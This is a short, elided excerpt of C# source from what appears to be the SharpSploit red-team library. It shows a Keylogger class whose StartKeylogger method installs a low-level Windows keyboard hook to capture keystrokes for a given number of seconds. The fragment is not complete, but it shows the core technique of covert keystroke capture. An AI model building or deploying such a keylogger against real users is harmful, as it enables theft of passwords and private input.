...
namespace SharpSploit.Enumeration
{
    public class Keylogger
    {
        ...
        private static string PreviousActiveWindow = "";
        ...
        public static string StartKeylogger(int Seconds)
        {
            ...
            stringBuilder.AppendLine(String.Format("Starting keylogger for {0} seconds.", Seconds));
            IntPtr HookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
